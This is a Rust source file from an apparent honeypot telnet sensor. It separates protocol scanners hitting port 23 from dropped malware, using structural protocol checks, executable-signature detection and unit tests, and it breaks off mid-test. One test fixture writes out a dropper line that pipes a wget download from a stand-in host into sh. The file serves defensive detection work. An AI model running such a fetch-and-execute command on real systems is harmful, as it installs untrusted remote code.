//! Telling a scanner speaking another protocol to port 23 from a binary pushed down a telnet
//! session.
//!
//! The telnet sensor keeps any binary-looking shell-phase input as a malware sample, so that a
//! dropper streamed at the prompt is never lost. The login is two raw lines, though, so a scanner
//! that opens port 23 and sends a TLS hello, an RDP request or an SMB negotiation has its first
//! bytes read as a "username" and "password" and the rest of the bytes land in the shell capture:
//! a few dozen bytes of protocol traffic, filed as a sample.
//!
//! [`verdict`] decides, from the leading bytes of the connection, whether a session was such a
//! probe. It is deliberately one-sided: a session is a probe only when EVERY check below agrees,
//! and each doubt resolves to "not a probe", which leaves the session handled exactly as before
//! (a sample, when the capture rules keep it).
//!
//! * The head must match a protocol's own opening bytes, validated structurally (length fields,
//!   fixed tokens), not by a bare first byte.
//! * Nothing in the session may look like an executable or archive ([`carries_executable_magic`]),
//!   wherever it sits, so a dropper cannot hide behind a protocol prefix it prepends.
//! * The session must be small ([`MAX_PROBE_WIRE_BYTES`]). Real droppers are larger than any
//!   hello; a size FLOOR alone would be unsafe (a 20-byte `#!/bin/sh` stub is a real dropper), so
//!   size only ever argues for keeping a sample, never against it.
//!
//! IAC negotiation is not a signature: every real telnet client opens with it, so it cannot
//! separate a probe from a dropper's session, and a session that only negotiates never reaches
//! the capture path (no login line arrives).

use std::net::IpAddr;

use sensor_framework::{Uuid, to_hex_bounded};
use sensor_wire::{PROTO_TCP, SIGNAL_CATCHALL_PROBE, SensorEvent, WIRE_VERSION};

/// How many leading bytes of the connection are kept to recognise a probe. Long enough for a
/// DNS query name (255 bytes at most) and a request line, short enough to hold per connection.
pub const HEAD_CAP: usize = 256;

/// The most bytes a session may have received, login and shell phase together, and still be a
/// probe. A ClientHello with post-quantum key shares is under 2 KB; beyond this size the bytes
/// are kept as a sample regardless of how they begin.
pub const MAX_PROBE_WIRE_BYTES: u64 = 4096;

/// `metadata.capture_reason` of the event a probe is recorded as.
pub const CAPTURE_REASON_PROBE_PAYLOAD: &str = "probe_payload";

const PROTOCOL_LABEL: &str = "telnet";

/// The protocols whose opening bytes are recognised.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ProbeProtocol {
    Tls,
    Sslv2,
    Rdp,
    X224,
    Smb,
    Http,
    Ssh,
    Sip,
    Rtsp,
    Dns,
    Jdwp,
    Redis,
    X11,
    Mqtt,
    Socks5,
    Socks4,
    Vnc,
    Adb,
    Postgres,
}

impl ProbeProtocol {
    /// The value stored in `metadata.probe_protocol`.
    pub fn label(self) -> &'static str {
        match self {
            Self::Tls => "tls",
            Self::Sslv2 => "sslv2",
            Self::Rdp => "rdp",
            Self::X224 => "x224",
            Self::Smb => "smb",
            Self::Http => "http",
            Self::Ssh => "ssh",
            Self::Sip => "sip",
            Self::Rtsp => "rtsp",
            Self::Dns => "dns",
            Self::Jdwp => "jdwp",
            Self::Redis => "redis",
            Self::X11 => "x11",
            Self::Mqtt => "mqtt",
            Self::Socks5 => "socks5",
            Self::Socks4 => "socks4",
            Self::Vnc => "vnc",
            Self::Adb => "adb",
            Self::Postgres => "postgres",
        }
    }
}

/// The protocol the connection's opening bytes belong to, or `None`.
pub fn classify(head: &[u8]) -> Option<ProbeProtocol> {
    if is_tls(head) {
        return Some(ProbeProtocol::Tls);
    }
    if is_sslv2(head) {
        return Some(ProbeProtocol::Sslv2);
    }
    if let Some(p) = x224_request(head) {
        return Some(p);
    }
    if is_smb(head) {
        return Some(ProbeProtocol::Smb);
    }
    if let Some(p) = request_line_protocol(head) {
        return Some(p);
    }
    if is_ssh(head) {
        return Some(ProbeProtocol::Ssh);
    }
    if is_dns_tcp(head) {
        return Some(ProbeProtocol::Dns);
    }
    if head.starts_with(b"JDWP-Handshake") {
        return Some(ProbeProtocol::Jdwp);
    }
    if is_resp(head) {
        return Some(ProbeProtocol::Redis);
    }
    if is_x11(head) {
        return Some(ProbeProtocol::X11);
    }
    if is_mqtt_connect(head) {
        return Some(ProbeProtocol::Mqtt);
    }
    if is_socks5(head) {
        return Some(ProbeProtocol::Socks5);
    }
    if is_socks4(head) {
        return Some(ProbeProtocol::Socks4);
    }
    if is_rfb(head) {
        return Some(ProbeProtocol::Vnc);
    }
    if is_adb_cnxn(head) {
        return Some(ProbeProtocol::Adb);
    }
    if is_postgres(head) {
        return Some(ProbeProtocol::Postgres);
    }
    None
}

/// Whether the session was a protocol probe, and which: `head` is the connection's first bytes,
/// `wire_bytes` everything it sent, `rest` the shell-phase bytes that were captured. `None`
/// keeps the session on the path it always took.
pub fn verdict(head: &[u8], wire_bytes: u64, rest: &[u8]) -> Option<ProbeProtocol> {
    if wire_bytes > MAX_PROBE_WIRE_BYTES {
        return None;
    }
    if carries_executable_magic(head) || carries_executable_magic(rest) {
        return None;
    }
    classify(head)
}

/// Whether `bytes` contain the signature of an executable, script or archive anywhere. Searched
/// everywhere, not only at the start: a probe's prefix can be prepended to a payload on purpose,
/// and a false hit only keeps a sample that was never needed to be dropped.
pub fn carries_executable_magic(bytes: &[u8]) -> bool {
    const MAGICS: &[&[u8]] = &[
        b"\x7fELF",
        &[0xfe, 0xed, 0xfa, 0xce],
        &[0xfe, 0xed, 0xfa, 0xcf],
        &[0xce, 0xfa, 0xed, 0xfe],
        &[0xcf, 0xfa, 0xed, 0xfe],
        b"#!/",
        b"#! /",
        b"PK\x03\x04",
        b"\x1f\x8b\x08",
        b"\xfd7zXZ\x00",
        b"7z\xbc\xaf\x27\x1c",
        b"Rar!\x1a\x07",
        b"!<arch>\n",
        b"ustar",
    ];
    MAGICS.iter().any(|m| contains(bytes, m))
        || (contains(bytes, b"MZ") && contains(bytes, b"PE\0\0"))
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}

/// A TLS record carrying a ClientHello: content type 22 (handshake), legacy record version
/// 3.0 to 3.4, a record length that fits one record, handshake type 1. RFC 8446 section 5.1
/// (record layer) and section 4.1.2 (ClientHello); the 3.x versions are RFC 5246 section 6.2.1
/// and RFC 6101.
fn is_tls(b: &[u8]) -> bool {
    b.len() >= 6
        && b[0] == 0x16
        && b[1] == 0x03
        && b[2] <= 0x04
        && b[5] == 0x01
        && (4..=16_384).contains(&u16::from_be_bytes([b[3], b[4]]))
}

/// An SSL 2.0 ClientHello, or the SSLv2-framed hello that SSL 3 and TLS clients may send first:
/// a two-byte header with the high bit set (a leading 0xff is a telnet IAC, never this), message
/// type 1, a version of 0.2 or 3.0 to 3.3, and room for the fixed fields. RFC 5246 appendix E.2
/// and RFC 6101 appendix E.2 give the compatible form; the SSL 2.0 draft
/// (draft-hickman-netscape-ssl-00, section 4) the header and CLIENT-HELLO.
fn is_sslv2(b: &[u8]) -> bool {
    b.len() >= 7
        && b[0] & 0x80 != 0
        && b[0] != 0xff
        && b[2] == 0x01
        && matches!([b[3], b[4]], [0, 2] | [3, 0..=3])
        && ((usize::from(b[0] & 0x7f) << 8) | usize::from(b[1])) >= 9
}

/// An X.224 Connection Request in a TPKT: version 3, reserved 0, a TPKT length equal to the
/// X.224 length indicator plus 5, TPDU code 0xE0. RFC 1006 section 6 and RFC 2126 section 4.3
/// (TPKT), ITU-T X.224 / ISO 8073 (the CR TPDU). RDP when the request carries the routing cookie
/// or a negotiation request ([MS-RDPBCGR] 2.2.1.1); otherwise it is plain ISO-on-TCP.
fn x224_request(b: &[u8]) -> Option<ProbeProtocol> {
    if b.len() < 11 || b[0] != 3 || b[1] != 0 || b[5] != 0xe0 {
        return None;
    }
    let tpkt_len = usize::from(u16::from_be_bytes([b[2], b[3]]));
    if tpkt_len < 11 || tpkt_len != usize::from(b[4]) + 5 {
        return None;
    }
    let rdp = contains(&b[11..], b"Cookie:") || contains(&b[11..], &[0x01, 0x00, 0x08, 0x00]);
    Some(if rdp {
        ProbeProtocol::Rdp
    } else {
        ProbeProtocol::X224
    })
}

/// SMB over NetBIOS or direct TCP: a session-message header (type 0) followed by the SMB1
/// (0xff "SMB") or SMB2/3 (0xfe "SMB") protocol id, [MS-SMB] section 2.2.1 and [MS-SMB2]
/// section 2.2.1; or a NetBIOS session request, RFC 1002 section 4.3.2 (type 0x81, two 34-byte
/// encoded names).
fn is_smb(b: &[u8]) -> bool {
    let message =
        b.len() >= 8 && b[0] == 0 && b[1] <= 1 && matches!(b[4], 0xff | 0xfe) && &b[5..8] == b"SMB";
    let session_request = b.len() >= 5
        && b[0] == 0x81
        && b[1] == 0
        && u16::from_be_bytes([b[2], b[3]]) >= 0x44
        && b[4] == 0x20;
    message || session_request
}

/// The first line, if the head is printable text up to a line break (or the end of the head).
fn first_line(b: &[u8]) -> Option<&[u8]> {
    let end = b
        .iter()
        .position(|&c| c == b'\r' || c == b'\n')
        .unwrap_or(b.len());
    let line = &b[..end];
    (!line.is_empty()
        && line
            .iter()
            .all(|&c| (0x20..=0x7e).contains(&c) || c == b'\t'))
    .then_some(line)
}

/// HTTP, SIP and RTSP all open with `METHOD SP target SP PROTOCOL/version`; the version token
/// tells them apart, because the methods overlap (OPTIONS is all three). HTTP: RFC 9110
/// section 9 (methods), RFC 9112 section 3 (request line), RFC 9113 section 3.4 (the HTTP/2
/// `PRI * HTTP/2.0` preface). SIP: RFC 3261 section 7.1. RTSP: RFC 2326 section 6.1 and
/// RFC 7826 section 6.1.
fn request_line_protocol(b: &[u8]) -> Option<ProbeProtocol> {
    const HTTP: &[&[u8]] = &[
        b"GET", b"HEAD", b"POST", b"PUT", b"DELETE", b"CONNECT", b"OPTIONS", b"TRACE", b"PATCH",
        b"PRI",
    ];
    const SIP: &[&[u8]] = &[
        b"INVITE",
        b"ACK",
        b"BYE",
        b"CANCEL",
        b"OPTIONS",
        b"REGISTER",
        b"PRACK",
        b"SUBSCRIBE",
        b"NOTIFY",
        b"PUBLISH",
        b"INFO",
        b"REFER",
        b"MESSAGE",
        b"UPDATE",
    ];
    const RTSP: &[&[u8]] = &[
        b"OPTIONS",
        b"DESCRIBE",
        b"SETUP",
        b"PLAY",
        b"PAUSE",
        b"TEARDOWN",
        b"ANNOUNCE",
        b"GET_PARAMETER",
        b"SET_PARAMETER",
        b"REDIRECT",
        b"RECORD",
    ];
    let line = first_line(b)?;
    let space = line.iter().position(|&c| c == b' ')?;
    let method = &line[..space];
    let versioned = |token: &[u8]| {
        line.windows(token.len())
            .position(|w| w == token)
            .is_some_and(|at| at > space)
    };
    let digit_after = |token: &[u8]| {
        line.windows(token.len() + 1)
            .any(|w| &w[..token.len()] == token && w[token.len()].is_ascii_digit())
    };
    if HTTP.contains(&method) && versioned(b" HTTP/") && digit_after(b" HTTP/") {
        return Some(ProbeProtocol::Http);
    }
    if SIP.contains(&method) && versioned(b" SIP/2.0") {
        return Some(ProbeProtocol::Sip);
    }
    if RTSP.contains(&method) && (versioned(b" RTSP/1.0") || versioned(b" RTSP/2.0")) {
        return Some(ProbeProtocol::Rtsp);
    }
    None
}

/// The SSH identification string, RFC 4253 section 4.2: `SSH-protoversion-softwareversion`.
fn is_ssh(b: &[u8]) -> bool {
    [&b"SSH-2.0-"[..], b"SSH-1.99-", b"SSH-1.5-"]
        .iter()
        .any(|p| b.starts_with(p))
}

/// A DNS query in a TCP stream: a two-byte length (RFC 1035 section 4.2.2, RFC 7766 section 8)
/// then a header with QR 0, a defined opcode, the reserved Z bit clear and one question, with
/// the QNAME parsed to its root label and a known class (RFC 1035 sections 4.1.1 and 4.1.2).
fn is_dns_tcp(b: &[u8]) -> bool {
    if b.len() < 19 {
        return false;
    }
    let len = usize::from(u16::from_be_bytes([b[0], b[1]]));
    let h = &b[2..];
    let flags = u16::from_be_bytes([h[2], h[3]]);
    let opcode = (flags >> 11) & 0xf;
    let counts = |at: usize| u16::from_be_bytes([h[at], h[at + 1]]);
    if flags >> 15 != 0
        || !matches!(opcode, 0 | 1 | 2 | 4 | 5)
        || (flags >> 6) & 1 != 0
        || counts(4) != 1
        || counts(6) != 0
        || counts(8) != 0
        || !(17..=4096).contains(&len)
    {
        return false;
    }
    let mut at = 12;
    loop {
        let Some(&label) = h.get(at) else {
            return false;
        };
        at += 1;
        if label == 0 {
            break;
        }
        if label > 63 || at + usize::from(label) > 12 + 255 {
            return false;
        }
        at += usize::from(label);
    }
    let Some(tail) = h.get(at..at + 4) else {
        return false;
    };
    let qtype = u16::from_be_bytes([tail[0], tail[1]]);
    let qclass = u16::from_be_bytes([tail[2], tail[3]]);
    qtype != 0 && matches!(qclass, 1 | 3 | 4 | 255) && len >= at + 4
}

/// A RESP command: an array header then a bulk-string header, `*N\r\n$L\r\n`. Redis protocol
/// specification, "RESP", array and bulk-string types.
fn is_resp(b: &[u8]) -> bool {
    let number = |from: usize, lead: u8| -> Option<usize> {
        if *b.get(from)? != lead {
            return None;
        }
        let digits = b[from + 1..]
            .iter()
            .take_while(|c| c.is_ascii_digit())
            .count();
        if digits == 0 || digits > 4 {
            return None;
        }
        let end = from + 1 + digits;
        (b.get(end..end + 2)? == b"\r\n").then_some(end + 2)
    };
    number(0, b'*')
        .and_then(|next| number(next, b'$'))
        .is_some()
}

/// The X11 connection setup request: byte order `l` or `B`, a pad byte, protocol version
/// 11.0 in that byte order. X Window System Protocol, "Connection Setup".
fn is_x11(b: &[u8]) -> bool {
    b.len() >= 12
        && b[1] == 0
        && match b[0] {
            b'l' => b[2..6] == [11, 0, 0, 0],
            b'B' => b[2..6] == [0, 11, 0, 0],
            _ => false,
        }
}

/// An MQTT CONNECT: packet type 1, a remaining length, then the protocol name and level.
/// OASIS MQTT 3.1.1 section 3.1 and MQTT 5.0 section 3.1 (`MQTT`, level 4 or 5); the 3.1 form
/// is `MQIsdp` with level 3.
fn is_mqtt_connect(b: &[u8]) -> bool {
    if b.first() != Some(&0x10) {
        return false;
    }
    let mut at = 1;
    loop {
        let Some(&byte) = b.get(at) else {
            return false;
        };
        at += 1;
        if byte & 0x80 == 0 {
            break;
        }
        if at > 4 {
            return false;
        }
    }
    let rest = &b[at..];
    (rest.starts_with(b"\x00\x04MQTT") && matches!(rest.get(6), Some(4 | 5)))
        || (rest.starts_with(b"\x00\x06MQIsdp") && rest.get(8) == Some(&3))
}

/// A SOCKS5 method-selection greeting: version 5, a method count, that many methods, every one
/// an assigned code (0 to 3). RFC 1928 section 3 and the IANA SOCKS methods registry.
fn is_socks5(b: &[u8]) -> bool {
    b.len() >= 3
        && b[0] == 5
        && (1..=8).contains(&b[1])
        && b.len() >= 2 + usize::from(b[1])
        && b[2..2 + usize::from(b[1])].iter().all(|&m| m <= 3)
}

/// A SOCKS4 or 4a request: version 4, command CONNECT or BIND, port, address, then a
/// NUL-terminated user id. SOCKS 4 protocol specification (Ying-Da Lee) and the 4a extension.
fn is_socks4(b: &[u8]) -> bool {
    b.len() >= 9 && b[0] == 4 && matches!(b[1], 1 | 2) && b[8..].contains(&0)
}

/// The RFB ProtocolVersion message, `RFB 003.008\n`. RFC 6143 section 7.1.1.
fn is_rfb(b: &[u8]) -> bool {
    b.len() >= 12
        && b.starts_with(b"RFB 00")
        && b[6].is_ascii_digit()
        && b[7] == b'.'
        && &b[8..10] == b"00"
        && b[10].is_ascii_digit()
        && b[11] == b'\n'
}

/// The ADB CNXN message: command `CNXN`, protocol version 0x01000000 or 0x01000001, and the
/// magic field equal to the command with all bits inverted. AOSP `adb/protocol.txt`,
/// "CONNECT(version, maxdata, "system-identity-string")" and the header layout.
fn is_adb_cnxn(b: &[u8]) -> bool {
    b.len() >= 24
        && &b[..4] == b"CNXN"
        && matches!(b[4..8], [0, 0, 0, 1] | [1, 0, 0, 1])
        && b[20..24] == [0xbc, 0xb1, 0xa7, 0xb1]
}

/// A PostgreSQL SSLRequest or GSSENCRequest (length 8 and request code 80877103 or 80877104),
/// or a protocol 3.0 StartupMessage opening with its `user` parameter. PostgreSQL protocol
/// documentation, "Message Formats".
fn is_postgres(b: &[u8]) -> bool {
    if b.len() >= 8
        && b[..4] == [0, 0, 0, 8]
        && matches!(b[4..8], [0x04, 0xd2, 0x16, 0x2f] | [0x04, 0xd2, 0x16, 0x30])
    {
        return true;
    }
    b.len() >= 13
        && u32::from_be_bytes([b[0], b[1], b[2], b[3]]) >= 13
        && b[4..8] == [0, 3, 0, 0]
        && &b[8..13] == b"user\0"
}

/// The evidence event for a probe: the existing `catchall_probe` signal, which is what a
/// scanner speaking the wrong protocol to a port is, with the protocol it was recognised as. It
/// has no `sample`, so it is never spooled, fetched, sent to VirusTotal or grouped into a sample
/// campaign.
pub fn probe_event(
    source_ip: IpAddr,
    wan_ip: Option<IpAddr>,
    session_id: Uuid,
    protocol: ProbeProtocol,
    head: &[u8],
    wire_bytes: u64,
) -> SensorEvent {
    SensorEvent {
        v: WIRE_VERSION,
        source_ip,
        wan_ip,
        sensor: PROTOCOL_LABEL.to_string(),
        signal_type: SIGNAL_CATCHALL_PROBE.to_string(),
        protocol: PROTO_TCP.to_string(),
        authenticated: false,
        observed_at: chrono::Utc::now(),
        metadata: serde_json::json!({
            "protocol_label": PROTOCOL_LABEL,
            "capture_reason": CAPTURE_REASON_PROBE_PAYLOAD,
            "probe_protocol": protocol.label(),
            "payload_hex": to_hex_bounded(head, HEAD_CAP),
            "observed_len": wire_bytes,
        }),
        sample: None,
        session_id: Some(session_id),
        occurrence_id: None,
        reply: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    /// Filler that contains no executable magic and no protocol signature.
    fn filler(n: usize) -> Vec<u8> {
        vec![0x41; n]
    }

    fn cat(parts: &[&[u8]]) -> Vec<u8> {
        parts.concat()
    }

    fn tls_hello() -> Vec<u8> {
        // Record header (handshake, 3.1, length 40), ClientHello, handshake length 36.
        cat(&[
            &[
                0x16, 0x03, 0x01, 0x00, 0x28, 0x01, 0x00, 0x00, 0x24, 0x03, 0x03,
            ],
            &filler(30),
        ])
    }

    fn sslv2_hello() -> Vec<u8> {
        // Two-byte header (length 22), CLIENT-HELLO, version 0.2, then the fixed length fields.
        cat(&[
            &[
                0x80, 0x16, 0x01, 0x00, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x10,
            ],
            &filler(16),
        ])
    }

    fn rdp_request() -> Vec<u8> {
        // TPKT length 19 = X.224 length indicator 14 + 5, CR TPDU, then a negotiation request.
        cat(&[
            &[0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0, 0, 0, 0, 0],
            &[0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00],
        ])
    }

    fn rdp_cookie_request() -> Vec<u8> {
        let cookie = b"Cookie: mstshash=user\r\n";
        let li = 6 + cookie.len() as u8;
        cat(&[&[0x03, 0x00, 0x00, li + 5, li, 0xe0, 0, 0, 0, 0, 0], cookie])
    }

    fn iso_request() -> Vec<u8> {
        // The same CR TPDU with no cookie and no negotiation request.
        cat(&[
            &[0x03, 0x00, 0x00, 0x0b, 0x06, 0xe0, 0, 0, 0, 0, 0],
            &filler(4),
        ])
    }

    fn smb1() -> Vec<u8> {
        cat(&[
            &[0x00, 0x00, 0x00, 0x54, 0xff, b'S', b'M', b'B', 0x72],
            &filler(20),
        ])
    }

    fn smb2() -> Vec<u8> {
        cat(&[
            &[0x00, 0x00, 0x00, 0x68, 0xfe, b'S', b'M', b'B'],
            &filler(20),
        ])
    }

    fn netbios_session_request() -> Vec<u8> {
        cat(&[&[0x81, 0x00, 0x00, 0x44, 0x20], &filler(32)])
    }

    fn dns_query() -> Vec<u8> {
        // Length 29: header (ID, flags 0x0100, one question), "example.test", type A, class IN.
        let mut q = vec![0x00, 0x1d, 0x12, 0x34, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0];
        q.extend_from_slice(b"\x07example\x04test\x00");
        q.extend_from_slice(&[0, 1, 0, 1]);
        let len = (q.len() - 2) as u16;
        q[..2].copy_from_slice(&len.to_be_bytes());
        q
    }

    fn mqtt_connect_311() -> Vec<u8> {
        cat(&[
            &[0x10, 0x10, 0x00, 0x04],
            b"MQTT",
            &[0x04, 0x02, 0x00, 0x3c, 0x00, 0x04],
            b"abcd",
        ])
    }

    fn mqtt_connect_31() -> Vec<u8> {
        cat(&[
            &[0x10, 0x12, 0x00, 0x06],
            b"MQIsdp",
            &[0x03, 0x02, 0x00, 0x3c, 0x00, 0x04],
            b"abcd",
        ])
    }

    fn adb_connect() -> Vec<u8> {
        cat(&[
            b"CNXN",
            &[0x00, 0x00, 0x00, 0x01],
            &[0x00, 0x10, 0x00, 0x00],
            &[0x07, 0x00, 0x00, 0x00],
            &[0x00, 0x00, 0x00, 0x00],
            &[0xbc, 0xb1, 0xa7, 0xb1],
            b"host::",
        ])
    }

    fn postgres_startup() -> Vec<u8> {
        cat(&[&[0, 0, 0, 0x13, 0, 3, 0, 0], b"user\0abcd\0\0"])
    }

    /// Every recognised protocol with the bytes a scanner opens with.
    fn positives() -> Vec<(ProbeProtocol, Vec<u8>)> {
        vec![
            (ProbeProtocol::Tls, tls_hello()),
            (ProbeProtocol::Sslv2, sslv2_hello()),
            (ProbeProtocol::Rdp, rdp_request()),
            (ProbeProtocol::Rdp, rdp_cookie_request()),
            (ProbeProtocol::X224, iso_request()),
            (ProbeProtocol::Smb, smb1()),
            (ProbeProtocol::Smb, smb2()),
            (ProbeProtocol::Smb, netbios_session_request()),
            (
                ProbeProtocol::Http,
                b"GET / HTTP/1.1\r\nHost: 192.0.2.1\r\n\r\n".to_vec(),
            ),
            (ProbeProtocol::Http, b"POST /x HTTP/1.0\r\n\r\n".to_vec()),
            (
                ProbeProtocol::Http,
                b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n".to_vec(),
            ),
            (
                ProbeProtocol::Http,
                b"CONNECT 192.0.2.9:443 HTTP/1.1\r\n\r\n".to_vec(),
            ),
            (ProbeProtocol::Ssh, b"SSH-2.0-OpenSSH_9.6\r\n".to_vec()),
            (ProbeProtocol::Ssh, b"SSH-1.99-scanner\r\n".to_vec()),
            (
                ProbeProtocol::Sip,
                b"OPTIONS sip:100@192.0.2.1 SIP/2.0\r\nVia: x\r\n\r\n".to_vec(),
            ),
            (
                ProbeProtocol::Sip,
                b"REGISTER sip:192.0.2.1 SIP/2.0\r\n\r\n".to_vec(),
            ),
            (
                ProbeProtocol::Rtsp,
                b"OPTIONS rtsp://192.0.2.1/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".to_vec(),
            ),
            (
                ProbeProtocol::Rtsp,
                b"DESCRIBE rtsp://192.0.2.1/live RTSP/1.0\r\n\r\n".to_vec(),
            ),
            (ProbeProtocol::Dns, dns_query()),
            (ProbeProtocol::Jdwp, b"JDWP-Handshake".to_vec()),
            (ProbeProtocol::Redis, b"*1\r\n$4\r\nPING\r\n".to_vec()),
            (
                ProbeProtocol::Redis,
                b"*3\r\n$3\r\nSET\r\n$1\r\na\r\n$1\r\nb\r\n".to_vec(),
            ),
            (
                ProbeProtocol::X11,
                cat(&[&[b'l', 0, 11, 0, 0, 0, 0, 0, 0, 0, 0, 0], &filler(8)]),
            ),
            (
                ProbeProtocol::X11,
                cat(&[&[b'B', 0, 0, 11, 0, 0, 0, 0, 0, 0, 0, 0], &filler(8)]),
            ),
            (ProbeProtocol::Mqtt, mqtt_connect_311()),
            (ProbeProtocol::Mqtt, mqtt_connect_31()),
            (ProbeProtocol::Socks5, vec![0x05, 0x01, 0x00]),
            (ProbeProtocol::Socks5, vec![0x05, 0x02, 0x00, 0x02]),
            (
                ProbeProtocol::Socks4,
                cat(&[&[4, 1, 0, 80, 192, 0, 2, 1], b"u\0"]),
            ),
            (ProbeProtocol::Vnc, b"RFB 003.008\n".to_vec()),
            (ProbeProtocol::Adb, adb_connect()),
            (
                ProbeProtocol::Postgres,
                vec![0, 0, 0, 8, 0x04, 0xd2, 0x16, 0x2f],
            ),
            (ProbeProtocol::Postgres, postgres_startup()),
        ]
    }

    #[test]
    fn each_signature_is_recognised_as_its_protocol() {
        for (want, bytes) in positives() {
            assert_eq!(classify(&bytes), Some(want), "{want:?}: {bytes:02x?}");
        }
    }

    #[test]
    fn a_full_probe_session_is_a_probe_and_its_label_is_the_protocol_name() {
        for (want, bytes) in positives() {
            assert_eq!(
                verdict(&bytes, bytes.len() as u64, &[]),
                Some(want),
                "{want:?}"
            );
        }
        let labels: std::collections::BTreeSet<_> =
            positives().iter().map(|(p, _)| p.label()).collect();
        assert_eq!(labels.len(), 19, "every protocol has a distinct label");
    }

    /// For each signature, the nearest bytes that are NOT that protocol. A signature that is
    /// only a first-byte test passes the positives and fails here.
    #[test]
    fn near_misses_of_each_signature_are_not_probes() {
        let mut cases: Vec<(&str, Vec<u8>)> = Vec::new();
        let mut with = |label: &'static str, mut bytes: Vec<u8>, at: usize, to: u8| {
            bytes[at] = to;
            cases.push((label, bytes));
        };
        with("tls: not a ClientHello", tls_hello(), 5, 0x02);
        with("tls: version 3.5", tls_hello(), 2, 0x05);
        with("tls: record length zero", tls_hello(), 4, 0x00);
        with("sslv2: message type", sslv2_hello(), 2, 0x04);
        with("sslv2: version", sslv2_hello(), 4, 0x09);
        with("x224: not a connection request", rdp_request(), 5, 0xd0);
        with("x224: length indicator", rdp_request(), 4, 0x0d);
        with("x224: tpkt reserved", rdp_request(), 1, 0x01);
        with("smb: protocol id", smb1(), 5, b'X');
        with("smb: session message type", smb1(), 0, 0x05);
        with("smb: marker byte", smb1(), 4, 0xfd);
        with("netbios: name length", netbios_session_request(), 4, 0x21);
        with("dns: response bit", dns_query(), 4, 0x81);
        with("dns: two questions", dns_query(), 7, 2);
        with("dns: class", dns_query(), 31, 9);
        with("dns: zero type", dns_query(), 29, 0);
        with("mqtt: level", mqtt_connect_311(), 8, 9);
        with("mqtt: packet type", mqtt_connect_311(), 0, 0x20);
        with("adb: magic", adb_connect(), 20, 0x00);
        with("adb: version", adb_connect(), 7, 0x02);
        with(
            "x11: version",
            cat(&[&[b'l', 0, 10, 0, 0, 0], &filler(8)]),
            2,
            10,
        );
        with("postgres: protocol", postgres_startup(), 5, 2);
        with("postgres: parameter", postgres_startup(), 8, b'x');
        with("vnc: terminator", b"RFB 003.008\n".to_vec(), 11, b' ');
        with(
            "socks5: method out of range",
            vec![0x05, 0x02, 0x00, 0x7f],
            3,
            0x7f,
        );
        with(
            "socks4: command",
            cat(&[&[4, 1, 0, 80, 192, 0, 2, 1], b"u\0"]),
            1,
            9,
        );
        for (label, bytes) in cases {
            assert_eq!(classify(&bytes), None, "{label}: {bytes:02x?}");
        }
        for (label, bytes) in [
            ("http: no version", b"GET / \r\n".to_vec()),
            ("http: unknown method", b"FETCH / HTTP/1.1\r\n".to_vec()),
            (
                "http: binary in the line",
                b"GET /\x01 HTTP/1.1\r\n".to_vec(),
            ),
            (
                "http: version is not a number",
                b"GET / HTTP/x\r\n".to_vec(),
            ),
            ("sip: http version", b"INVITE x HTTP/1.1\r\n".to_vec()),
            ("rtsp: sip version", b"PLAY x SIP/2.0\r\n".to_vec()),
            ("ssh: not a banner", b"SSH-3.0-x\r\n".to_vec()),
            ("redis: no bulk header", b"*1\r\nPING\r\n".to_vec()),
            ("redis: no count", b"*\r\n$4\r\n".to_vec()),
            ("jdwp: partial", b"JDWP-Handsh".to_vec()),
            ("socks5: truncated methods", vec![0x05, 0x03, 0x00]),
            (
                "socks4: no user id terminator",
                vec![4, 1, 0, 80, 192, 0, 2, 1, b'u'],
            ),
            ("vnc: wrong major", b"RFB 103.008\n".to_vec()),
            ("tls: too short to be sure", vec![0x16, 0x03, 0x01]),
            // IAC DO ECHO followed by two control bytes: every real telnet client opens with an
            // IAC, and the SSLv2 header test would read this one as a hello without the IAC rule.
            (
                "sslv2: a telnet option negotiation",
                vec![0xff, 0xfd, 0x01, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00],
            ),
            ("empty", Vec::new()),
        ] {
            assert_eq!(classify(&bytes), None, "{label}: {bytes:02x?}");
        }
    }

    /// What the telnet sensor exists to catch must never be demoted to a probe.
    #[test]
    fn real_payloads_and_logins_are_not_probes() {
        let elf = cat(&[b"\x7fELF\x02\x01\x01\x00", &filler(40)]);
        let script = b"#!/bin/sh\nwget http://192.0.2.9/a -O- | sh\n".to_vec();
        let login = b"root\r\nhunter2\r\n".to_vec();
        let mut noise = Vec::new();
        let mut x = 0x9e37_79b9_u32;
        for _ in 0..175 {
            x ^= x << 13;
            x ^= x >> 17;
            x ^= x << 5;
            noise.push((x >> 24) as u8);
        }
        for (label, bytes) in [
            ("elf", elf),
            ("shebang", script),
            ("login", login),
            ("noise", noise),
        ] {
            assert_eq!(
                verdict(&bytes, bytes.len() as u64, &[]),
                None,
                "{label} must stay on the sample path"
            );
        }
    }

    /// A dropper that opens with a protocol header to look like a scanner keeps its payload:
    /// the executable signature wins wherever it sits, in the head or in the captured rest.
    #[test]
    fn an_executable_behind_a_protocol_prefix_is_still_a_sample() {
        let elf = cat(&[b"\x7fELF\x02\x01\x01\x00", &filler(40)]);
        let hello = tls_hello();
        assert_eq!(
            verdict(&hello, hello.len() as u64, &[]),
            Some(ProbeProtocol::Tls)
        );
        assert_eq!(verdict(&hello, 500, &elf), None, "ELF in the captured rest");
        let prefixed = cat(&[&hello, &elf]);
        assert_eq!(
            verdict(&prefixed, prefixed.len() as u64, &[]),
            None,
            "ELF in the head"
        );
        for payload in [
            b"#!/bin/sh\nid\n".to_vec(),
            b"#! /bin/sh\nid\n".to_vec(),
            b"PK\x03\x04xx".to_vec(),
            b"\x1f\x8b\x08\x00".to_vec(),
            b"\xfd7zXZ\x00xx".to_vec(),
            b"7z\xbc\xaf\x27\x1cxx".to_vec(),
            b"Rar!\x1a\x07xx".to_vec(),
            b"!<arch>\nxx".to_vec(),
            cat(&[&filler(257), b"ustar"]),
            cat(&[b"MZ", &filler(60), b"PE\0\0"]),
            vec![0xfe, 0xed, 0xfa, 0xce, 0, 0, 0, 0],
